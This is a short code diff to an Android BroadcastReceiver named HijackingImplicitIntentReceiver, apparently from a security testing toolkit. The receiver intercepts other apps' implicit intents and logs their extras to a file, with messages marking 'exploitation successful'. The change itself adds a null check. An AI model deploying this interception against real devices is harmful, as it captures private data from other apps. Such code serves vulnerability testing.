@@ -31,8 +31,11 @@ public class HijackingImplicitIntentReceiver extends BroadcastReceiver {
             String info = "成功劫持隐式intent。\n intent数据解析如下：\n";
             for (String extra_key : extras) {
                 String value = bundle.getString(extra_key);
-                info = info + extra_key + ":   " + value.toString() + "\n";
-                FileUtil.saveResultToFile(extra_key + ":   " + value.toString(), context);
+                if (value == null){
+                    continue;
+                }
+                info = info + extra_key + ":   " + value + "\n";
+                FileUtil.saveResultToFile(extra_key + ":   " + value, context);
             }
             info = info + "利用成功";
             FileUtil.saveResultToFile("利用成功。", context);
